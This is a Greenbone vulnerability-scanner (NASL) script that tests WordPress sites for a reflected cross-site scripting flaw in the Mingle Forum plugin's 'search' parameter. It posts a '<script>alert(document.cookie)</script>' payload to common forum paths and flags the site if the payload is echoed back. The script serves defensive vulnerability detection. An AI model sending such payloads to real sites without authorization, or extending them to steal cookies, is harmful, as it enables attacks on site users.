# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902665");
  script_version("2023-03-01T10:20:04+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:04 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2012-03-29 16:02:43 +0530 (Thu, 29 Mar 2012)");
  script_name("WordPress Mingle Forum Plugin 'search' Parameter XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"VendorFix");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");
  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary
web script or HTML in a user's browser session in the context of an affected
site.");
  script_tag(name:"affected", value:"WordPress Mingle Forum Plugin version 1.0.33");
  script_tag(name:"insight", value:"The flaw is due to an input passed via the 'search' parameter is
not properly sanitized before being returned to the user.");
  script_tag(name:"solution", value:"Upgrade to WordPress Mingle Forum Plugin version 1.0.34.");
  script_tag(name:"summary", value:"The WordPress plugin 'Mingle Forum' is prone to a cross-site scripting (XSS) vulnerability.");
  script_xref(name:"URL", value:"http://www.1337day.com/exploits/17826");
  script_xref(name:"URL", value:"http://tunisianseven.blogspot.in/2012/03/mingle-forum-wordpress-plugin-xss.html");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/mingle-forum/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

useragent = http_get_user_agent();

url = "/?mingleforumaction=search";

postdata = "search_words=<script>alert(document.cookie)</script>" +
           "&search_submit=Search+forums";

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

foreach forum (make_list("/forum", "/forums", "/le-forum"))
{
  url2 = dir + forum + url;
  req = string("POST ", url2, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postdata), "\r\n",
               "\r\n", postdata);
  res = http_keepalive_send_recv(port:port, data:req);

  if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res) {
    report = http_report_vuln_url(port:port, url:url2);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
